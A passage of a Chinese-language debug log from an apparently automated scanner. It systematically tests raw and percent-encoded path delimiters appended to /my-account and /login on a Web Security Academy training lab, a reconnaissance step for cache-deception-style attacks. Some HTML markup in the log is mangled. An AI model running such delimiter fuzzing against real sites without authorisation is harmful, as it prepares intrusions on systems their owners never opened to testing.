href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%2Daa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%2Daa</a><br>2025/10/23 20:45:19 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%252D’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%252Daa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%252Daa</a><br>2025/10/23 20:45:19 [DEBUG] 正在测试分隔符 (来自字典): ‘%2E’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%2Eaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%2Eaa</a><br>2025/10/23 20:45:20 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%252E’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%252Eaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%252Eaa</a><br>2025/10/23 20:45:20 [DEBUG] 正在测试分隔符 (来自字典): ‘%2F’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%2Faa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%2Faa</a><br>2025/10/23 20:45:20 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%252F’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%252Faa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%252Faa</a><br>2025/10/23 20:45:20 [DEBUG] 正在测试分隔符 (来自字典): ‘%3A’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%3Aaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%3Aaa</a><br>2025/10/23 20:45:21 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%253A’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%253Aaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%253Aaa</a><br>2025/10/23 20:45:21 [DEBUG] 正在测试分隔符 (来自字典): ‘%3B’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%3Baa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%3Baa</a><br>2025/10/23 20:45:21 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%253B’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%253Baa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%253Baa</a><br>2025/10/23 20:45:21 [DEBUG] 正在测试分隔符 (来自字典): ‘%3C’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%3Caa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%3Caa</a><br>2025/10/23 20:45:21 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%253C’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%253Caa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%253Caa</a><br>2025/10/23 20:45:21 [DEBUG] 正在测试分隔符 (来自字典): ‘%3D’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%3Daa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%3Daa</a><br>2025/10/23 20:45:22 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%253D’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%253Daa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%253Daa</a><br>2025/10/23 20:45:22 [DEBUG] 正在测试分隔符 (来自字典): ‘%3E’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%3Eaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%3Eaa</a><br>2025/10/23 20:45:22 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%253E’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%253Eaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%253Eaa</a><br>2025/10/23 20:45:22 [DEBUG] 正在测试分隔符 (来自字典): ‘%3F’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%3Faa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%3Faa</a><br>2025/10/23 20:45:22 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%253F’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%253Faa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%253Faa</a><br>2025/10/23 20:45:23 [DEBUG] 正在测试分隔符 (来自字典): ‘%40’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%40aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%40aa</a><br>2025/10/23 20:45:23 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%2540’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%2540aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%2540aa</a><br>2025/10/23 20:45:23 [DEBUG] 正在测试分隔符 (来自字典): ‘%5B’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%5Baa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%5Baa</a><br>2025/10/23 20:45:23 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%255B’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%255Baa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%255Baa</a><br>2025/10/23 20:45:23 [DEBUG] 正在测试分隔符 (来自字典): ‘%5C’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%5Caa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%5Caa</a><br>2025/10/23 20:45:23 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%255C’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%255Caa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%255Caa</a><br>2025/10/23 20:45:24 [DEBUG] 正在测试分隔符 (来自字典): ‘%5D’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%5Daa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%5Daa</a><br>2025/10/23 20:45:24 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%255D’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%255Daa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%255Daa</a><br>2025/10/23 20:45:24 [DEBUG] 正在测试分隔符 (来自字典): ‘%5E’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%5Eaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%5Eaa</a><br>2025/10/23 20:45:24 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%255E’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%255Eaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%255Eaa</a><br>2025/10/23 20:45:24 [DEBUG] 正在测试分隔符 (来自字典): ‘%5F’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%5Faa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%5Faa</a><br>2025/10/23 20:45:25 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%255F’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%255Faa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%255Faa</a><br>2025/10/23 20:45:25 [DEBUG] 正在测试分隔符 (来自字典): ‘%60’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%60aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%60aa</a><br>2025/10/23 20:45:25 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%2560’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%2560aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%2560aa</a><br>2025/10/23 20:45:25 [DEBUG] 正在测试分隔符 (来自字典): ‘%7B’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%7Baa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%7Baa</a><br>2025/10/23 20:45:25 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%257B’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%257Baa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%257Baa</a><br>2025/10/23 20:45:25 [DEBUG] 正在测试分隔符 (来自字典): ‘%7C’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%7Caa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%7Caa</a><br>2025/10/23 20:45:26 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%257C’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%257Caa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%257Caa</a><br>2025/10/23 20:45:26 [DEBUG] 正在测试分隔符 (来自字典): ‘%7D’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%7Daa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%7Daa</a><br>2025/10/23 20:45:26 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%257D’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%257Daa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%257Daa</a><br>2025/10/23 20:45:26 [DEBUG] 正在测试分隔符 (来自字典): ‘%7E’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%7Eaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%7Eaa</a><br>2025/10/23 20:45:26 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%257E’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%257Eaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%257Eaa</a><br>2025/10/23 20:45:27 [DEBUG] 正在为分隔符检测选择基础URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login</a><br>2025/10/23 20:45:27 [DEBUG] 正在测试分隔符 (来自字典): ‘!’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login!aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login!aa</a><br>2025/10/23 20:45:27 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%21’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%21aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%21aa</a><br>2025/10/23 20:45:27 [DEBUG] 正在测试分隔符 (来自字典): ‘“‘, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login&quot;aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login&quot;aa</a><br>2025/10/23 20:45:27 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%22’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%22aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%22aa</a><br>2025/10/23 20:45:27 [DEBUG] 正在测试分隔符 (来自字典): ‘#’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login#aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login#aa</a><br>2025/10/23 20:45:28 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%23’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%23aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%23aa</a><br>2025/10/23 20:45:28 [DEBUG] 正在测试分隔符 (来自字典): ‘$’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login$aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login$aa</a><br>2025/10/23 20:45:28 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%24’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%24aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%24aa</a><br>2025/10/23 20:45:28 [DEBUG] 正在测试分隔符 (来自字典): ‘%’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%aa</a><br>2025/10/23 20:45:28 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%25’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%25aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%25aa</a><br>2025/10/23 20:45:29 [DEBUG] 正在测试分隔符 (来自字典): ‘&amp;’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login&amp;aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login&amp;aa</a><br>2025/10/23 20:45:29 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%26’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%26aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%26aa</a><br>2025/10/23 20:45:29 [DEBUG] 正在测试分隔符 (来自字典): ‘’’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login&#39;aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login&#39;aa</a><br>2025/10/23 20:45:29 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%27’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%27aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%27aa</a><br>2025/10/23 20:45:29 [DEBUG] 正在测试分隔符 (来自字典): ‘(‘, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login(aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login(aa</a><br>2025/10/23 20:45:29 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%28’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%28aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%28aa</a><br>2025/10/23 20:45:30 [DEBUG] 正在测试分隔符 (来自字典): ‘)’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login)aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login)aa</a><br>2025/10/23 20:45:30 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%29’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%29aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%29aa</a><br>2025/10/23 20:45:30 [DEBUG] 正在测试分隔符 (来自字典): ‘<em>‘, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login</a></em>aa<br>2025/10/23 20:45:30 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%2A’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%2Aaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%2Aaa</a><br>2025/10/23 20:45:30 [DEBUG] 正在测试分隔符 (来自字典): ‘+’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login+aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login+aa</a><br>2025/10/23 20:45:31 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%2B’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%2Baa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%2Baa</a><br>2025/10/23 20:45:31 [DEBUG] 正在测试分隔符 (来自字典): ‘,’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login,aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login,aa</a><br>2025/10/23 20:45:31 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%2C’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%2Caa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%2Caa</a><br>2025/10/23 20:45:31 [DEBUG] 正在测试分隔符 (来自字典): ‘-‘, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login-aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login-aa</a><br>2025/10/23 20:45:31 [DEBUG] 正在测试分隔符 (来自字典): ‘.’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login.aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login.aa</a><br>2025/10/23 20:45:31 [DEBUG] 正在测试分隔符 (来自字典): ‘/‘, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login/aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login/aa</a><br>2025/10/23 20:45:32 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%2F’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%2Faa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%2Faa</a><br>2025/10/23 20:45:32 [DEBUG] 正在测试分隔符 (来自字典): ‘:’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login:aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login:aa</a><br>2025/10/23 20:45:32 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%3A’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%3Aaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%3Aaa</a><br>2025/10/23 20:45:32 [DEBUG] 正在测试分隔符 (来自字典): ‘;’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login;aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login;aa</a><br>2025/10/23 20:45:32 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%3B’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%3Baa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%3Baa</a><br>2025/10/23 20:45:32 [DEBUG] 正在测试分隔符 (来自字典): ‘&lt;’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login</a><aa2025/10/23 20:45:33 [DEBUG] 正在测试分隔符 (字典条目编码后): '%3C', URL: https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%3Caa2025/10/23 20:45:33 [DEBUG] 正在测试分隔符 (来自字典): '=', URL: https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login=aa2025/10/23 20:45:33 [DEBUG] 正在测试分隔符 (字典条目编码后): '%3D', URL: https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%3Daa2025/10/23 20:45:33 [DEBUG] 正在测试分隔符 (来自字典): '>', URL: https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login>aa<br>2025/10/23 20:45:33 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%3E’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%3Eaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%3Eaa</a><br>2025/10/23 20:45:34 [DEBUG] 正在测试分隔符 (来自字典): ‘?’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login?aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login?aa</a><br>2025/10/23 20:45:34 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%3F’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%3Faa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%3Faa</a><br>2025/10/23 20:45:34 [DEBUG] 正在测试分隔符 (来自字典): ‘@’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login@aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login@aa</a><br>2025/10/23 20:45:34 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%40’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%40aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%40aa</a><br>2025/10/23 20:45:34 [DEBUG] 正在测试分隔符 (来自字典): ‘[‘, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login[aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login[aa</a><br>2025/10/23 20:45:34 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%5B’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%5Baa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%5Baa</a><br>2025/10/23 20:45:35 [DEBUG] 正在测试分隔符 (来自字典): ‘\’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login\aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login\aa</a><br>2025/10/23 20:45:35 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%5C’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%5Caa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%5Caa</a><br>2025/10/23 20:45:35 [DEBUG] 正在测试分隔符 (来自字典): ‘]’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login]aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login]aa</a><br>2025/10/23 20:45:35 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%5D’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%5Daa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%5Daa</a><br>2025/10/23 20:45:35 [DEBUG] 正在测试分隔符 (来自字典): ‘^’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login^aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login^aa</a><br>2025/10/23 20:45:36 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%5E’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%5Eaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%5Eaa</a><br>2025/10/23 20:45:36 [DEBUG] 正在测试分隔符 (来自字典): ‘</em>‘, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login_aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login_aa</a><br>2025/10/23 20:45:36 [DEBUG] 正在测试分隔符 (来自字典): ‘<code>&#39;, URL: https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login</code>aa<br>2025/10/23 20:45:36 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%60’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%60aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%60aa</a><br>2025/10/23 20:45:36 [DEBUG] 正在测试分隔符 (来自字典): ‘{‘, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login{aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login{aa</a><br>2025/10/23 20:45:36 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%7B’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%7Baa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%7Baa</a><br>2025/10/23 20:45:37 [DEBUG] 正在测试分隔符 (来自字典): ‘|’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login|aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login|aa</a><br>2025/10/23 20:45:37 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%7C’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%7Caa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%7Caa</a><br>2025/10/23 20:45:37 [DEBUG] 正在测试分隔符 (来自字典): ‘}’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login}aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login}aa</a><br>2025/10/23 20:45:37 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%7D’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%7Daa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%7Daa</a><br>2025/10/23 20:45:37 [DEBUG] 正在测试分隔符 (来自字典): ‘~’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login~aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login~aa</a><br>2025/10/23 20:45:37 [DEBUG] 正在测试分隔符 (来自字典): ‘%21’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%21aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%21aa</a><br>2025/10/23 20:45:38 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%2521’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%2521aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%2521aa</a><br>2025/10/23 20:45:38 [DEBUG] 正在测试分隔符 (来自字典): ‘%22’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%22aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%22aa</a><br>2025/10/23 20:45:38 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%2522’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%2522aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%2522aa</a><br>2025/10/23 20:45:38 [DEBUG] 正在测试分隔符 (来自字典): ‘%23’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%23aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%23aa</a><br>2025/10/23 20:45:38 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%2523’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%2523aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%2523aa</a><br>2025/10/23 20:45:39 [DEBUG] 正在测试分隔符 (来自字典): ‘%24’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%24aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%24aa</a><br>2025/10/23 20:45:39 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%2524’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%2524aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%2524aa</a><br>2025/10/23 20:45:39 [DEBUG] 正在测试分隔符 (来自字典): ‘%25’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%25aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%25aa</a><br>2025/10/23 20:45:39 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%2525’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%2525aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%2525aa</a><br>2025/10/23 20:45:39 [DEBUG] 正在测试分隔符 (来自字典): ‘%26’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%26aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login%26aa</a><br>2025/10/23 20:45:39 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%2526’, URL: <a 